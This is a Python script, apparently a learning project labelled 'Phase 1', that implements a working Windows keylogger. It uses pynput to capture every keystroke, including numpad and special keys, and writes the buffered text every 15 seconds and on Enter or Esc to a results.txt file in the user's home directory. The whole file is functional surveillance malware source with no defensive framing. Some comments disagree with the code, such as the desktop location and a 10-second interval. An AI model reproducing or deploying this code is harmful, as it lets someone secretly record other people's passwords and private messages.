''' Phase 1: Building the keylogger script
Description & features: 
The keylogger works specially with focus on Windows using a path for store in a .txt file all the inputs of the user
The keylogger is designed to log keystrokes in a file named "results.txt" located on the user's desktop.
It captures both regular character keys and special keys (like space, enter, backspace)'''

import logging #used to log the keystrokes to a file
import os #use to handle files or paths
from threading import Thread, Lock #for run multiple threat
from pynput.keyboard import Key, KeyCode, Listener as KeyboardListener #for listen all the inputs of the keyboard
import time #for delay


#Specify the dir and file of the log file
directory = os.path.join(os.path.expanduser("~"), "") 

filename = "results.txt" #name of the file
path = os.path.join(directory, filename)
pressed_keys = set() #this var tracks pressed keys

#configure a basic config
logging.basicConfig(
    filename = path, #this specifies the file where the logs will saved
    level = logging.INFO, #setting the level of the file: "Info level"
    format = "%(message)s" #format how the messages will displayed "date/message"
)

#global functions for buffering
current_entry = [] 
buffer_lock = Lock() #to ensure thread-safe access to the buffer
logging_interval = 15 #log every 10 seconds
number_pad = {
    96: '0', 97: '1',  98: '2', 99: '3', 100: '4', 101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
    106: '*', 107: '+', 109: '-', 110: '.', 111: '/'
}

#function for common keys
def press_key(key):
    with buffer_lock:
        try:
            if hasattr(key, 'char') and key.char is not None:
                current_entry.append(key.char)
            
            elif hasattr(key, 'vk') and key.vk in number_pad:
                current_entry.append(number_pad[key.vk])  # Log NumPad keys correctly

            elif key == Key.space:
                current_entry.append(" ")  # Log space as a space character
            
            elif key == Key.enter:
                full_sentence = "".join(current_entry)  # Log enter as a new line
                logging.info(full_sentence)  # Log the full sentence before the new line
                current_entry.clear()  # Clear the current entry after logging
            
            elif key == Key.backspace:
                if current_entry:
                    current_entry.pop()  # Remove the last character from the buffer

        except Exception as e:
            logging.error(f"Error processing key press: {e}")

#function for special keys
def release(key):
    if key == Key.esc:  # Stop listener on 'Esc' key
        with buffer_lock:
            if current_entry:
                logging.info("".join(current_entry))
                current_entry.clear()
        return False

def log_keystrokes():
    while True:
        time.sleep(logging_interval)
        with buffer_lock:
            if current_entry:
                logging.info("".join(current_entry))
                current_entry.clear()

def start_listener(): 
    try:
        with KeyboardListener(on_press=press_key, on_release=release) as listener: #calls the functions
            logging_thread = Thread(target=log_keystrokes, daemon=True)
            logging_thread.start()
            listener.join() #it keeps the listener running until it's stopped

    except Exception as e: #handling possible errors
        logging.error(f"Error in listener: {e}")

keyboard_thread = Thread(target=start_listener)#thread for keyboard

keyboard_thread.start()#starting thread

